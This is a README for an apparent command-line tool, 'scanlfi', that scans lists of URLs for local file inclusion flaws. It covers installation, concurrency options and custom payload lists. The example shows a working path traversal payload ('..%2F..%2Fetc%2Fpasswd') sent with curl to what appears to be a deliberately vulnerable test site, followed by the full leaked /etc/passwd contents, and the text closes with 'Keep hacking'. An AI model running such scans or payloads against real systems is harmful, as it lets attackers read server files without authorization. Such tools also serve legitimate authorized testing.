
# SCANLFI

This software will detect lfi on a list of urls.



## Features

- custom payload support
- fast 
- fully automated


## Installation 
`git clone https://github.com/seczoid/scanlfi/ && cd scanlfi`

`go build -o scanlfi main.go`

`chmod +x scanlfi`

`mv scanlfi /usr/bin`


## Usage

`cat urls.txt | scanlfi -p pathtotest.txt -c 100`


-p takes the payloads list, -c takes the concurrency limit. 


## Example


`echo "http://testphp.vulnweb.com/showimage.php?file=" | scanlfi -p pathtotest.txt -c 100`


output: 

[+] Vulnerable: http://testphp.vulnweb.com/showimage.php?file=..%2F..%2Fetc%2Fpasswd



lets confirm using curl.. 


```
curl http://testphp.vulnweb.com/showimage.php\?file\=..%2F..%2Fetc%2Fpasswd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
nobody:x:65534:1002:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:102::/home/syslog:/bin/false
klog:x:102:103::/home/klog:/bin/false
mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false
bind:x:104:111::/var/cache/bind:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin

```

ThankYou. Keep hacking
